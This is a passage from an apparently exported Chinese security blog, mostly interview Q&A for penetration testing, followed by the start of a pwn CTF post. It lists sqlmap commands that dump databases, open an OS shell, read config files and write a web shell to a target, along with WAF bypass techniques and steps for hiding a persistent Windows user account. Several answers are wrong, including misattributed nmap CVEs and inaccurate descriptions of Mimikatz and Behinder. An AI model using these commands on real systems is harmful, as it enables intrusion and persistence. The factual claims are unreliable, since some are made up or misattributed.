Token、启用HTTPS等。此外，还应该定期对登录页面进行渗透测试和安全评估，及时发现并修复潜在的漏洞。</p><h2 id="sql盲注有几种方法？"><a href="#sql盲注有几种方法？" class="headerlink" title="sql盲注有几种方法？"></a>sql盲注有几种方法？</h2><p>SQL盲注是指通过构造特定的SQL语句，利用Web应用程序的漏洞来获取敏感信息或执行具有破坏性的操作。根据不同的条件和情况，SQL盲注可以分为以下几种方法：</p><ol><li>基于布尔盲注：基于布尔盲注的攻击方式是常见的SQL盲注手段之一。黑客通过构造恶意的SQL语句，向Web应用程序提交查询请求，并观察返回结果中的布尔值（True或False）来推断查询语句中的条件是否成立。在这种攻击方式中，黑客通常会构造使用”AND”或者”OR”关键字的语句，以及适当的参数组合，从而判断出数据库中的数据是否符合预期要求。</li><li>基于时间盲注：基于时间盲注也是SQL盲注的一种类型。在这种攻击方式中，黑客通过构造恶意的SQL语句，在查询时增加等待时间，以便观测程序在执行恶意查询后的响应时间。如果响应时间与正常情况下相比明显延长，则说明恶意查询已经被执行。</li><li>基于错误消息盲注：基于错误消息盲注是另一种常见的SQL盲注攻击方式。黑客通过构造恶意的SQL语句，向Web应用程序提交查询请求，如果数据不符合预期要求，则会触发数据库的错误消息。黑客可以通过观察错误消息中的详细信息，推断出恶意查询是否执行成功。</li><li>基于联合查询盲注：基于联合查询盲注是另一种SQL盲注攻击方式。在这种攻击方式中，黑客通过构造特定的SQL语句，并使用”UNION”关键字来实现查询结果的合并。黑客可以通过修改查询语句中的参数，或者增加或减少查询中的表格数目，来获取敏感信息或执行破坏性操作。</li></ol><p>总之，SQL盲注是一种危险的攻击手段，开发人员需要采取有效的防御措施，避免出现潜在的漏洞。例如，开发人员可以对用户输入数据进行严格的检验和过滤，限制用户输入的字符类型和长度，尽量避免使用动态拼接字符串的方式构造SQL语句，加强数据库本身的安全性等。</p><h2 id="不给你工具，怎么进行webshell排杀"><a href="#不给你工具，怎么进行webshell排杀" class="headerlink" title="不给你工具，怎么进行webshell排杀"></a>不给你工具，怎么进行webshell排杀</h2><p>要进行Webshell排查和清除，需要在服务器上执行以下步骤：</p><ol><li>扫描服务器，寻找异常进程、文件和网络连接。可以使用诸如lsof、netstat、ps等命令来查找可疑的进程和网络连接。</li><li>检查服务器中是否存在任何未知文件或目录，特别是具有隐藏属性的文件和目录。可以使用find命令查找所有文件和目录，并检查其中是否存在可疑的文件和目录。</li><li>检查服务器上是否存在未知用户和组。可以使用cat /etc/passwd和cat /etc/group命令来查看系统中的用户和组，并检查其中是否存在可疑的用户和组。</li><li>检查服务器上的系统日志，包括/var/log/messages、/var/log/secure等文件，以查找异常事件。</li><li>如果发现可疑的Webshell文件，需要立即将其删除，并检查相关的网站和数据库是否被入侵。</li><li>更新服务器上的操作系统和应用程序，并安装最新的防病毒软件和安全补丁，以提高服务器的安全性。</li></ol><p>以上这些操作需要有一定的Linux系统管理基础，如果您不熟悉这些操作，建议联系专业的安全人员进行处理。此外，为了减少Webshell攻击的风险，请您注意加强服务器的安全设置，定期备份重要数据，并限制外部访问服务器的权限。</p><h2 id="拿下内网主机如何判断它的权限"><a href="#拿下内网主机如何判断它的权限" class="headerlink" title="拿下内网主机如何判断它的权限"></a>拿下内网主机如何判断它的权限</h2><p>当您成功入侵一台内网主机后，您需要评估该主机的权限级别。以下是一些常见方法：</p><ol><li>查看当前用户的权限：使用命令<code>whoami</code>或<code>id</code>查看当前用户的权限。如果当前用户是root或管理员权限，则他们可以访问和修改系统上所有机密数据和配置文件。</li><li>检查可用的系统命令：使用命令<code>sudo -l</code>来查看当前用户是否可以执行以root权限运行的系统命令。如果您有足够的权限，可以使用<code>sudo</code>命令来执行特权操作。</li><li>检查系统日志：检查系统日志文件中是否有任何异常记录。攻击者可能会在日志文件中删除其活动痕迹，因此需要查看备份日志文件。</li><li>查看安全配置：检查密码策略、防火墙配置、网络访问控制列表等配置文件，以确定当前用户能否绕过这些保护层进行更高级别的攻击。</li><li>检查进程和服务：使用命令<code>ps -ef</code>或<code>systemctl list-units</code>来查看正在运行的进程和服务。如果您看到未知的进程或服务正在运行，则可能存在恶意软件或后门程序。</li></ol><p>总之，在评估被攻击的内部系统时，重要的是要了解当前用户拥有哪些权限，并确定攻击者是否已经获得更高的权限或在系统上留下了后门。建议在评估过程中使用多种技术和工具来获取完整的信息，以确保您有足够的信息来进行正确的决策，从而保护您的系统和数据免受攻击。</p><h2 id="同源策略是什么"><a href="#同源策略是什么" class="headerlink" title="同源策略是什么"></a>同源策略是什么</h2><p>同源策略（Same Origin Policy）是一种Web安全策略，它是浏览器中的一项重要特性，用于限制从一个源加载的文档或脚本如何与来自另一个源的资源进行交互。同源指的是三个关键元素：协议、主机和端口号，只有这三者完全相同的两个URL才被认为是同源的。</p><p>同源策略可以防止恶意网站访问其他网站的敏感数据，例如Cookie、LocalStorage和请求响应等信息，从而保护用户的隐私和安全。</p><p>例如，假设您正在访问一个银行的网站，该银行使用Cookie来存储您的登录凭据。如果攻击者能够在他们的网站上注入一些JavaScript代码并通过某种方式将其转移到您正在访问的银行网站上，那么该攻击者就可以访问您的Cookie，以便窃取您的个人信息。然而，由于同源策略的存在，攻击者无法访问您正在访问的银行网站的Cookie，因为它们不属于同一个源。</p><p>尽管同源策略对Web安全至关重要，但在某些情况下，它可能会成为开发过程中的挑战。为了解决这些问题，Web开发人员可以使用一些技术和标记，如跨域资源共享（CORS）和JSONP等来解决这些限制。</p><h2 id="说一下几种常见的逻辑漏洞"><a href="#说一下几种常见的逻辑漏洞" class="headerlink" title="说一下几种常见的逻辑漏洞"></a>说一下几种常见的逻辑漏洞</h2><p>逻辑漏洞指的是应用程序中的编码错误或设计缺陷，使攻击者可以利用不符合预期的逻辑来绕过安全控制并实现攻击目标。以下是几种常见的逻辑漏洞：</p><ol><li>注册送礼：在这种攻击中，攻击者通过欺骗用户注册帐户并提供个人信息的方式来获取某种奖励或礼物，从而收集大量有价值的用户数据。攻击者利用了开发人员未正确处理奖励机制的事实，并通过暴力破解、自动化脚本等方式创建大量虚假账户。</li><li>提交订单时修改价格：在这种漏洞中，攻击者可以通过提交订单时修改商品价格来获得不当利益。攻击者可能会修改页面上显示的价格、数量或其他参数，以实现价格欺诈。</li><li>超额退款：攻击者通过修改应用程序中的退款机制或直接与客户服务联系，以获取超出实际退款金额的退款，从而实现盈利。</li><li>非法访问：在这种漏洞中，攻击者可以通过绕过身份验证或访问控制机制，以获取未经授权的访问权限。攻击者可能会使用一些技术手段，如SQL注入、目录遍历、文件包含等来绕过访问控制机制。</li><li>不当的会话管理：攻击者可以通过利用应用程序中的会话机制漏洞，以获取受害者的会话令牌或密码。攻击者可能会使用会话劫持、会话固定攻击等技术手段，从而窃取用户的身份验证信息。</li></ol><p>以上是常见的几种逻辑漏洞，这些漏洞需要开发人员在设计和编写代码时注意到，并采取相应的防范措施，例如使用安全的会话管理、访问控制、输入验证等措施，从而保护应用程序的安全性。</p><h2 id="如何判断是否存在越权漏洞"><a href="#如何判断是否存在越权漏洞" class="headerlink" title="如何判断是否存在越权漏洞"></a>如何判断是否存在越权漏洞</h2><p>越权漏洞是指攻击者可以未经授权地访问或修改受限资源的漏洞。一些常见的越权漏洞包括：</p><ol><li>管理员账户欺骗：攻击者通过伪装成管理员或其他特权用户，以获取访问受限资源的权限。</li><li>直接对象引用：攻击者可以直接访问应用程序中的受保护对象或文件，而不需要通过身份验证或授权过程。</li><li>会话劫持：攻击者可以窃取正在进行的会话ID，以获得访问受限资源的权限。</li><li>暴力破解：攻击者可以使用暴力破解技术，如穷举法或字典攻击等，来尝试猜测受限资源的密码或凭证。</li></ol><p>要判断是否存在越权漏洞，可以考虑以下方法：</p><ol><li>分析应用程序的访问控制机制，查看哪些资源受到了访问限制。</li><li>测试应用程序的身份验证和授权机制，以了解是否存在身份验证缺陷、密码弱点等问题。</li><li>使用模拟攻击工具或手动测试来模拟攻击者的行为，并尝试访问受限资源，以确定是否存在越权漏洞。</li><li>针对常见的越权漏洞类型，如管理员账户欺骗、会话劫持等，采取相应的安全措施和加固策略。</li></ol><p>总之，要发现和修复越权漏洞，需要审查应用程序的访问控制机制、身份验证和授权流程，并通过模拟攻击和手动测试来判断是否存在越权漏洞。定期进行漏洞扫描和安全评估也是必要的，以确保应用程序始终保持安全状态。</p><h2 id="sql注入遇到waf，怎么绕过"><a href="#sql注入遇到waf，怎么绕过" class="headerlink" title="sql注入遇到waf，怎么绕过"></a>sql注入遇到waf，怎么绕过</h2><p>以下是几种常见的方法：</p><ol><li>使用编码：攻击者可以对注入负载进行编码，例如使用十六进制或Unicode编码等方式，以绕过WAF对字符集的检查。攻击者还可以使用字符串分割、大小写转换等技术手段，以使WAF无法识别恶意代码。</li><li>使用注入器：SQL注入攻击工具如Sqlmap、Havij、SQLi-hunter等，可以自动检测和利用各种SQL注入漏洞，并通过绕过WAF来获取敏感数据。</li><li>盲注：在盲注攻击中，攻击者不直接获取查询结果，而是根据应用程序的响应来判断是否存在漏洞。攻击者可以使用时间延迟或错误信息来判断是否存在漏洞，并以此来推断数据库中的数据。</li><li>变形注入：变形注入攻击是一种多次执行的注入攻击，使用变体的注入负载，使注入负载不同于以前的攻击负载，从而逃避WAF的检测。</li></ol><h2 id="了解过哪些安全设备"><a href="#了解过哪些安全设备" class="headerlink" title="了解过哪些安全设备"></a>了解过哪些安全设备</h2><ol><li>华为防火墙：华为防火墙是华为公司生产的安全产品之一，主要用于网络边界安全和数据中心安全。它提供了多种安全功能，例如流量管理、入侵检测、VPN接入等。</li><li>绿盟防火墙：绿盟防火墙是北京绿盟科技有限公司开发的一款网络安全产品，具有防御DDoS、DNS攻击、漏洞利用等攻击的能力，还支持大规模分布式部署。</li><li>启明星辰边界安全网关：启明星辰边界安全网关是启明信息技术股份有限公司推出的一款综合性安全产品，它能够提供网络访问控制、应用层协议识别、反病毒防护、VPN等多种安全功能。</li><li>360天擎安全产品：360天擎安全产品是由360集团推出的综合性安全产品，包括了防火墙、入侵检测、威胁情报、网络行为分析等多种安全功能，可支持大规模企业部署。</li><li>安恒安全产品：安恒信息安全技术有限公司是国内知名的网络安全服务提供商之一，其生产的安全产品包括了威胁情报、攻击检测、漏洞管理等多种安全功能，广泛应用于金融、电信、政府等行业。</li></ol><h2 id="了解过哪些安全产品"><a href="#了解过哪些安全产品" class="headerlink" title="了解过哪些安全产品"></a>了解过哪些安全产品</h2><ol><li>网络安全设备类：网络安全设备类产品主要包括防火墙、入侵检测系统、Web应用安全网关、DDoS防护等。例如华为防火墙、启明星辰边界安全网关、绿盟防火墙、360天擎等。</li><li>终端安全类：终端安全产品主要用于保护个人电脑、移动设备和服务器的安全，主要包括反病毒软件、安全加固、数据加密、身份认证等。例如360安全卫士、金山毒霸、腾讯电脑管家等。</li><li>数据安全类：数据安全产品主要用于保护企业敏感数据不被泄露或篡改，主要包括加密、备份恢复、数据控制等。例如深信服信息加密解决方案、启明星辰数据加密产品、山石网科数据泄漏防护等。</li><li>互联网安全类：互联网安全产品主要用于保护企业在互联网上的各种应用、网站、云服务等安全，主要包括云安全、移动安全、Web应用安全和容器安全等。例如弘善网络云安全解决方案、卫士通移动安全系统、腾讯安全云等。</li></ol><h2 id="冰蝎的流量特征是什么"><a href="#冰蝎的流量特征是什么" class="headerlink" title="冰蝎的流量特征是什么"></a>冰蝎的流量特征是什么</h2><p>冰蝎是一种常见的远控工具(RAT)，其流量特征如下：</p><ol><li>使用HTTP协议：冰蝎使用HTTP协议与C&amp;C服务器通信，从而绕过网络策略和防火墙的检测。</li><li>自定义加密：冰蝎使用自定义加密算法对数据进行加密，以避免被网络监测器和安全设备检测到。</li><li>动态命令: 通过inline和eval函数动态执行指令并返回结果，这使得冰蝎可以运行各种自定义代码，例如扫描目标、下载和安装其他恶意软件等。</li><li>内存驻留: 冰蝎不需要在受感染设备上安装文件或建立持久性，它只需要注入进程并在内存中驻留，从而难以被传统杀毒软件检测和清除。</li><li>支持多平台：冰蝎支持Windows, Linux, and Mac OS等操作系统，这使得攻击者可以在跨多个平台上远程控制受感染设备。</li></ol><p>总之，冰蝎的流量特征是使用HTTP协议、自定义加密、动态命令、内存驻留和支持多平台。网络管理员可以根据这些特征来识别和阻止冰蝎远控攻击。</p><h2 id="使用猕猴桃工具需要什么权限"><a href="#使用猕猴桃工具需要什么权限" class="headerlink" title="使用猕猴桃工具需要什么权限"></a>使用猕猴桃工具需要什么权限</h2><p>猕猴桃是一种常用的网络安全工具，使用该工具需要以下权限：</p><ol><li>对目标主机进行扫描：猕猴桃工具需要能够对目标主机或网络进行扫描，以收集有关目标系统和服务的信息。因此，使用者需要有足够的网络访问权限，以便对目标进行扫描和探测。</li><li>探测漏洞：猕猴桃工具通过对目标系统和服务进行扫描，并使用已知的漏洞进行测试，从而确定可能存在的安全漏洞。这需要使用者有足够的权限，以便在目标主机上执行相关的漏洞检测工作。</li><li>管理目标系统：有时候，为了修复发现的漏洞，需要对目标系统进行配置和管理。这需要使用者拥有足够的管理员权限，以便修改系统设置、安装补丁等。</li></ol><h2 id="sqlmap常用命令"><a href="#sqlmap常用命令" class="headerlink" title="sqlmap常用命令"></a>sqlmap常用命令</h2><p>SQLMap是一种常用的自动化SQL注入攻击工具，可以对目标网站进行全自动的SQL注入漏洞扫描和利用。以下是一些SQLMap的常用命令：</p><ol><li>基本扫描命令：</li></ol><pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://target.com/page.php?id=1" --dbs       # 获取所有可利用的数据库sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables  # 获取指定数据库中的所有表sqlmap -u "http://target.com/page.php?id=1" -D dbname -T tablename --columns   # 获取指定表中的所有列sqlmap -u "http://target.com/page.php?id=1" -D dbname -T tablename -C columnname --dump    # 获取指定列中的数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>POST请求和Cookie：</li></ol><pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://target.com/login.php" --data="username=admin&amp;password=1234" --cookie="PHPSESSID=abcd1234" --level=5 --risk=3   # 向登录页面发送POST请求和Cookie，并对网站进行深度扫描<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol><li>手动指定注入点：</li></ol><pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql --technique=T --random-agent --level=5 --risk=3 --current-db --users --passwords --privileges --threads=10 --batch --skip-waf --tamper=randomcomments -p id   # 指定注入点为id参数，绕过WAF设置，使用随机HTTP头和注入负载进行扫描<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol><li>高级命令：</li></ol><pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://target.com/page.php?id=1" --os-shell     # 获取操作系统Shellsqlmap -u "http://target.com/page.php?id=1" --os-pwn       # 获取操作系统级别的访问权限sqlmap -u "http://target.com/page.php?id=1" --file-read="/var/www/config.php"  # 读取指定文件内容sqlmap -u "http://target.com/page.php?id=1" --file-write="/var/www/shell.php" --file-dest="/var/www/html/" --tamper="apostrophemask.py" --batch   # 向目标服务器写入Web Shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="nmap存在什么漏洞"><a href="#nmap存在什么漏洞" class="headerlink" title="nmap存在什么漏洞"></a>nmap存在什么漏洞</h2><p>Nmap是一种用于网络探测和安全评估的常用工具，不过它本身也存在一些漏洞，以下是一些已公开的Nmap漏洞：</p><ol><li>CVE-2016-3714: ImageMagick命令注入漏洞</li></ol><p>Nmap使用ImageMagick库来处理图像，在旧版本的ImageMagick中存在命令注入漏洞。攻击者可以构造恶意图像文件，通过Nmap执行这些文件的时候触发该漏洞，导致执行任意命令。</p><ol><li>CVE-2017-11615：脚本引擎环境变量注入漏洞</li></ol><p>Nmap支持在其脚本引擎中执行Lua脚本，而在某些情况下，攻击者可以利用环境变量注入漏洞来执行恶意Lua脚本，从而危及系统安全。</p><ol><li>CVE-2018-15173: 路径遍历漏洞</li></ol><p>该漏洞存在于Nmap HTTP服务器中，攻击者可以利用此漏洞通过HTTP服务在目标系统上执行任意命令。</p><p>需要注意的是，这些漏洞大多数已经被修复，并且很少会对最新版本的Nmap构成威胁。建议用户始终使用最新版本的Nmap，并遵循最佳实践，如限制对Nmap的访问权限，避免使用默认帐户和密码，以及定期更新配置文件等。</p><h2 id="nmap常用口令"><a href="#nmap常用口令" class="headerlink" title="nmap常用口令"></a>nmap常用口令</h2><p>Nmap是一种常用的端口扫描和网络发现工具，可以使用各种方式来扫描目标主机和网络，并检测可用的服务和隐蔽的漏洞。以下是一些常用的Nmap口令：</p><ol><li>扫描单个主机：</li></ol><pre class="line-numbers language-none"><code class="language-none">nmap &lt;target_ip&gt;                 # 扫描指定IP地址nmap &lt;target_hostname&gt;           # 扫描指定主机名nmap -p 1-65535 &lt;target&gt;          # 扫描所有端口nmap -sV &lt;target&gt;                # 扫描目标版本信息nmap -O &lt;target&gt;                 # 扫描目标操作系统信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>扫描多个主机：</li></ol><pre class="line-numbers language-none"><code class="language-none">nmap &lt;subnet&gt;                    # 扫描子网中的所有主机nmap -iL &lt;targets.txt&gt;           # 扫描包含目标主机列表的文件nmap -sP &lt;subnet&gt;                # 扫描子网中的所有活动主机（ping扫描）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol><li>扫描特定协议：</li></ol><pre class="line-numbers language-none"><code class="language-none">nmap -sT &lt;target&gt;                # 使用TCP进行扫描nmap -sU &lt;target&gt;                # 使用UDP进行扫描nmap -sS &lt;target&gt;                # 使用SYN进行扫描nmap -sA &lt;target&gt;                # 使用ACK进行扫描nmap -sF &lt;target&gt;                # 使用FIN进行扫描nmap -sX &lt;target&gt;                # 使用XMAS进行扫描<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>扫描选项和指令：</li></ol><pre class="line-numbers language-none"><code class="language-none">nmap -T&lt;level&gt; &lt;target&gt;          # 设置扫描速度（0-5，默认为3）nmap --top-ports=&lt;number&gt; &lt;target&gt;     # 指定前N个常用端口进行扫描nmap --script=&lt;name&gt; &lt;target&gt;    # 使用指定的脚本进行扫描nmap -oA &lt;basename&gt; &lt;target&gt;     # 生成三种格式的输出文件（文本、XML、gnmap）nmap -v &lt;target&gt;                 # 显示详细信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="给你一个ip，你如何溯源到真人"><a href="#给你一个ip，你如何溯源到真人" class="headerlink" title="给你一个ip，你如何溯源到真人"></a>给你一个ip，你如何溯源到真人</h2><ol><li>Whois查询：可以通过Whois工具或网站查询IP地址的拥有者和注册信息，包括公司名称、联系人和注册日期等。如果该IP地址属于一个企业或机构，还可以了解其业务性质和所处行业。</li><li>端口扫描：使用端口扫描工具（如Nmap）来探测目标主机上开放的服务和端口，从而推断出其所属行业、用途和技术特征等。</li><li>元数据分析：通过分析目标网站上的元数据，如网页标题、描述和关键字等，以及抓取页面内容和搜索引擎索引等，可以了解网站的业务性质、所处行业和活动范围等。</li><li>社交媒体监测：通过监测目标主机和公司的社交媒体账号，例如微博、LinkedIn和Facebook等，可以获取更多的信息和联系方式，并尝试建立人际关系网络。</li></ol><h2 id="正向shell和反向shell的区别是什么"><a href="#正向shell和反向shell的区别是什么" class="headerlink" title="正向shell和反向shell的区别是什么"></a>正向shell和反向shell的区别是什么</h2><p>正向shell和反向shell都是与远程主机建立命令行连接的工具，可以允许用户执行命令或者进行文件传输等操作。它们的区别在于连接的方向和建立方式：</p><ol><li>正向shell</li></ol><p>正向shell通常是在目标主机上启动一个服务端程序，等待用户连接并进行身份验证后，允许用户在该主机上执行命令。因此，正向shell需要用户能够直接连接到目标主机，并且需要提供一些身份验证方式来保障安全性。</p><ol><li>反向shell</li></ol><p>反向shell则是在攻击者主机上启动一个客户端程序，通过网络连接到目标主机并执行指定的命令或脚本。这种方式通常需要绕过防火墙和其他安全措施，利用漏洞或社会工程学技巧获取目标主机的网络访问权限，因此往往会被视为一种黑客攻击技术。</p><h2 id="连接不了MySQL数据库站点的原因是什么？"><a href="#连接不了MySQL数据库站点的原因是什么？" class="headerlink" title="连接不了MySQL数据库站点的原因是什么？"></a>连接不了MySQL数据库站点的原因是什么？</h2><p>连接不上MySQL数据库站点的原因可能有很多，以下是一些可能的原因：</p><ol><li>数据库服务未启动或已停止：如果MySQL服务器未正确启动或已停止，就无法连接到该服务。</li><li>网络连接问题：如果网络连接不稳定或存在障碍，就可能导致连接失败。例如，防火墙可能会阻止对MySQL端口的访问，或者路由器可能会限制对外部主机的访问。</li><li>认证失败：如果提供的用户名和密码无效，则连接将被拒绝。用户必须确保使用正确的凭据进行身份验证。</li><li>权限问题：如果用户没有足够的权限来连接到MySQL服务器，就可能会出现连接错误。管理员需要检查和修改授权策略以允许合适的用户访问数据库。</li><li>MySQL配置问题：MySQL安装和配置过程中可能存在问题，例如MySQL服务监听错误的网络接口、未正确设置字符集等，这些都可能导致连接失败。</li></ol><p>解决连接不上MySQL数据库站点的问题，需要仔细排除以上可能的原因，并逐步调整相关配置或修复故障。同时，建议用户采取相应的安全措施，如加密通信、限制访问权限和实施备份等来保护数据安全。</p><h2 id="文件上传的检测点有哪些"><a href="#文件上传的检测点有哪些" class="headerlink" title="文件上传的检测点有哪些"></a>文件上传的检测点有哪些</h2><p>文件上传是一种常见的Web攻击方式，攻击者可以通过上传恶意文件来获取目标系统的控制权或执行其他恶意行为。以下是一些可能用到的文件上传检测点：</p><ol><li>文件类型和扩展名：在上传文件时，应该限制允许上传的文件类型和扩展名，并禁止上传可执行文件和脚本等危险文件，例如.exe、.php、.asp等。</li><li>文件大小：应该限制上传文件的大小，以避免恶意用户上传大型文件导致系统资源耗尽，或者上传超过限制大小的文件绕过其他安全措施。</li><li>文件内容检查：对于允许上传的文件，应该进行内容检查，确保其中不包含任何恶意代码、无效数据或其他潜在的安全风险。</li><li>文件重命名：对于上传的文件，应该使用随机的文件名来避免攻击者对其进行识别和攻击。</li><li>路径遍历检查：应该检查上传文件的路径，并防止攻击者利用路径遍历漏洞来上传文件到非预期目录。</li><li>权限和访问控制：应该根据用户身份和角色来控制文件上传的权限和访问控制，防止未经授权的用户上传文件并访问到应用程序中的敏感数据。</li><li>文件处理和存储：应该将上传的文件存储在安全的位置，并对其进行适当的处理和过滤，例如加密、压缩、解压等操作。同时，应该监测并记录所有的文件上传操作，以便后续的审核和追踪。</li></ol><h2 id="常用的外围打点工具有哪些"><a href="#常用的外围打点工具有哪些" class="headerlink" title="常用的外围打点工具有哪些"></a>常用的外围打点工具有哪些</h2><p>外围打点是一种通过对目标系统进行浅层次的探测，获取其基本信息和漏洞情况等方法。以下是一些常用的外围打点工具：</p><ol><li>Nmap：Nmap是一款开源的网络探测工具，可以扫描远程主机和端口，并提供许多高级功能，如操作系统检测、服务版本识别和漏洞扫描等。</li><li>Masscan：Masscan是一款超快的端口扫描器，可以在短时间内对大量目标主机进行快速扫描，并支持TCP和UDP协议。</li><li>Hping：Hping是一款命令行的网络工具，可用于发送自定义数据包和探测目标主机的端口和服务状态。</li><li>Netcat：Netcat是一款多功能的网络工具，可用于创建TCP/UDP连接、传输文件、执行shell命令等。</li><li>Metasploit：Metasploit是一款渗透测试框架，其中包含了许多漏洞利用模块和扫描功能，可用于快速发现目标系统的弱点并进行攻击。</li><li>Nessus：Nessus是一款商业化的漏洞扫描器，可用于检测目标主机和应用程序中的安全漏洞和风险，以及提供修复建议和报告。</li></ol><h2 id="描述一下外围打点的基本流程"><a href="#描述一下外围打点的基本流程" class="headerlink" title="描述一下外围打点的基本流程"></a>描述一下外围打点的基本流程</h2><p>外围打点是一种对目标系统进行浅层次探测的方法，可以帮助安全人员了解目标系统的基本情况和漏洞状况。下面是外围打点的基本流程：</p><ol><li><p>信息收集：在进行外围打点之前，需要先收集相关的信息，包括目标系统的IP地址、域名、开放端口和服务等。可以使用一些工具和技术来收集这些信息，如Whois查询、DNS解析、端口扫描、网络枚举等。</p></li><li><p>网络探测：在收集到目标系统的基本信息后，可以使用网络探测工具进行扫描，以获取更详细的信息和漏洞情况。常用的网络探测工具包括Nmap、Hping、Netcat等，可以进行端口扫描、协议检测、操作系统识别等。</p></li><li><p>漏洞扫描：在探测到目标系统的开放端口和服务后，可以使用漏洞扫描工具来检测其中的安全漏洞和风险。常用的漏洞扫描工具包括Nessus、OpenVAS等，可以通过自动化的方式对目标系统进行安全评估和检测，并生成相应的报告和建议。</p></li><li><p>漏洞利用：在发现目标系统的安全漏洞后，可以使用一些漏洞利用工具进行攻击和渗透测试。常用的漏洞利用工具包括Metasploit、Exploit-db等，可以通过自动化或手动的方式对目标系统进行攻击，并获取相应的权限和访问权。</p></li><li><p>安全评估：最后，需要对外围打点的结果进行分析和总结，评估目标系统的安全性和风险情况，并提出相应的建议和措施来改善安全状况。</p><h2 id="在Windows靶标站点如何建立隐藏用户？"><a href="#在Windows靶标站点如何建立隐藏用户？" class="headerlink" title="在Windows靶标站点如何建立隐藏用户？"></a>在Windows靶标站点如何建立隐藏用户？</h2></li></ol><p>在Windows靶标站点上，可以通过以下步骤建立隐藏用户：</p><ol><li><p>打开计算机管理器：在Windows菜单中搜索“计算机管理器”，或者在“控制面板”中找到“管理工具”并选择“计算机管理器”。</p></li><li><p>创建新用户：在计算机管理器中，展开“本地用户和组”，右键单击“用户”文件夹，并选择“新建用户”。在弹出的对话框中输入用户名和密码等信息，然后单击“创建”。</p></li><li><p>修改注册表：在Windows注册表中添加一个名为“SpecialAccounts”的子项。依次展开“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts”。如果该子项不存在，则需要手动创建。</p></li><li><p>添加用户：在“SpecialAccounts”下创建一个名为“UserList”的新项，然后右键选择“DWORD值”并将其命名为新创建的用户账户名称。接着将此项的数值设为0，以使该用户不会被列出在登录界面上。</p></li><li><p>保存更改：保存所有修改后，注销当前用户或重新启动计算机，隐藏用户将随之生效。</p><h2 id="文件包含漏洞的原理和防护？"><a href="#文件包含漏洞的原理和防护？" class="headerlink" title="文件包含漏洞的原理和防护？"></a>文件包含漏洞的原理和防护？</h2></li></ol><p>文件包含漏洞（File Inclusion Vulnerability）是一种常见的Web应用程序漏洞，攻击者可以利用该漏洞向服务器传递恶意数据或代码，从而获取敏感信息或控制服务器。其原理主要涉及到以下内容：</p><ol><li>文件包含方式：Web应用程序通常会使用动态脚本语言（如PHP、ASP等）来动态地生成网页内容。其中，文件包含函数（如include、require等）允许将一个文件的内容嵌入到另一个文件中，以实现模块化和重用性。</li><li>用户输入信任：当Web应用程序采用用户输入作为文件路径参数时，如果未对这些参数进行足够的过滤和验证，就可能导致恶意数据或代码被动态地加载到页面中。</li><li>恶意代码注入：攻击者可以通过向文件路径参数中注入恶意代码或文件名来触发文件包含漏洞，并在服务器上执行恶意操作。例如，攻击者可以上传一个包含恶意代码的文件，并将其作为文件路径参数传递给目标服务器，从而执行恶意操作。</li></ol><p>为了防止文件包含漏洞，需要采取一些安全措施，如下所示：</p><ol><li>过滤和验证用户输入：在接收用户输入作为文件路径参数时，必须对其进行过滤和验证，确保其中不包含任何恶意数据或代码。</li><li>使用绝对路径而非相对路径：在使用文件包含函数时，应该使用绝对路径而非相对路径，以避免攻击者通过注入如“../”等文件路径跳出当前目录并访问其他文件。</li><li>限制访问范围：为了防止攻击者利用文件包含漏洞攻击服务器上的敏感文件，可以通过配置文件访问权限和文件夹安全策略等方式来限制访问范围。</li><li>升级和更新软件：Web应用程序中经常会存在许多漏洞和安全风险，因此需要及时升级和更新相关软件和组件，以确保最新的补丁和安全措施已经被采纳。</li></ol>]]></content>
      
      
      <categories>
          
          <category> HW </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HW面经 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn013-034</title>
      <link href="/du-yu/pwn-begain-exerciser-03.html"/>
      <url>/du-yu/pwn-begain-exerciser-03.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、pwn013-c源代码"><a href="#一、pwn013-c源代码" class="headerlink" title="一、pwn013.c源代码"></a>一、pwn013.c源代码</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;int main() {    char flag[] = {99, 116, 102, 115, 104, 111, 119, 123, 104, 79, 119, 95, 116, 48, 95, 117, 115, 51, 95, 71, 67, 67, 63, 125, 0};    printf("%s", flag);    return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在C语言中，<code>char</code>不是一个函数，而是一个数据类型，用于存储字符。当我们创建一个<code>char</code>类型的变量或数组，并给它赋值时，我们可以直接使用字符，如 <code>'a'</code>，或者使用对应的ASCII值，如 <code>97</code>。这两种方式都是等价的，因为 <code>'a'</code> 的ASCII值就是 <code>97</code>。</p><p>例如，以下两种方式创建的字符变量是等价的：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">char ch1 = 'a';char ch2 = 97;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在这两种情况下，<code>ch1</code> 和 <code>ch2</code> 都存储了字符 <code>'a'</code>。</p><p>同样，我们可以使用ASCII值来初始化字符数组：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">char arr1[] = {'H', 'e', 'l', 'l', 'o', '\0'};char arr2[] = {72, 101, 108, 108, 111, 0};<span aria-hidden="true" 